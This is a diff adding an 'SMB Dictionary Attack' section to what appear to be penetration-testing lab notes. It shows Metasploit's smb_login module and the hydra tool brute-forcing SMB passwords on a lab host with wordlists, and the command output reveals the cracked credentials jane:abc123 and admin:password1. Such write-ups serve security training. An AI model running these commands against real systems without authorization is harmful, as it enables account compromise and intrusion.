@@ -589,4 +589,57 @@ smb: \secret\> get flag
 getting file \secret\flag of size 33 as flag (32.2 KiloBytes/sec) (average 32.2 KiloBytes/sec)
 ```
 
+## SMB Dictionary Attack
+
+We're going to enumerate SMB share utilizing Metasploit and a wordlist for dictionary attacks.
+
+```sh
+msf5 > use auxiliary/scanner/smb/smb_login
+msf5 auxiliary(scanner/smb/smb_login) > set rhosts 192.9.143.3
+rhosts => 192.9.143.3
+msf5 auxiliary(scanner/smb/smb_login) > set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt
+pass_file => /usr/share/wordlists/metasploit/unix_passwords.txt
+msf5 auxiliary(scanner/smb/smb_login) > set smbuser jane
+smbuser => jane
+msf5 auxiliary(scanner/smb/smb_login) > run
+
+[*] 192.9.143.3:445       - 192.9.143.3:445 - Starting SMB login bruteforce
+[-] 192.9.143.3:445       - 192.9.143.3:445 - Failed: '.\jane:admin',
+[!] 192.9.143.3:445       - No active DB -- Credential data will not be saved!
+[-] 192.9.143.3:445       - 192.9.143.3:445 - Failed: '.\jane:123456',
+[-] 192.9.143.3:445       - 192.9.143.3:445 - Failed: '.\jane:12345',
+[-] 192.9.143.3:445       - 192.9.143.3:445 - Failed: '.\jane:123456789',
+[-] 192.9.143.3:445       - 192.9.143.3:445 - Failed: '.\jane:password',
+[-] 192.9.143.3:445       - 192.9.143.3:445 - Failed: '.\jane:iloveyou',
+[-] 192.9.143.3:445       - 192.9.143.3:445 - Failed: '.\jane:princess',
+[-] 192.9.143.3:445       - 192.9.143.3:445 - Failed: '.\jane:1234567',
+[-] 192.9.143.3:445       - 192.9.143.3:445 - Failed: '.\jane:12345678',
+[+] 192.9.143.3:445       - 192.9.143.3:445 - Success: '.\jane:abc123'
+[*] 192.9.143.3:445       - Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+Another way of doing this is by using `hydra` tool:
+
+<pre class="language-sh"><code class="lang-sh">root@attackdefense:~# hydra <a data-footnote-ref href="#user-content-fn-2">-l</a> admin <a data-footnote-ref href="#user-content-fn-3">-P</a> /usr/share/wordlists/rockyou.txt <a data-footnote-ref href="#user-content-fn-4">192.9.143.3</a> <a data-footnote-ref href="#user-content-fn-5">smb</a>
+Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-12-28 07:12:09
+[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
+[DATA] max 1 task per 1 server, overall 1 task, 14344399 login tries (l:1/p:14344399), ~14344399 tries per task
+[DATA] attacking smb://192.9.143.3:445/
+<strong>[445][smb] host: 192.9.143.3   login: admin   password: password1
+</strong>1 of 1 target successfully completed, 1 valid password found
+</code></pre>
+
+
+
 [^1]: 
+
+[^2]: login username
+
+[^3]: Password List
+
+[^4]: Target Host
+
+[^5]: Protocol
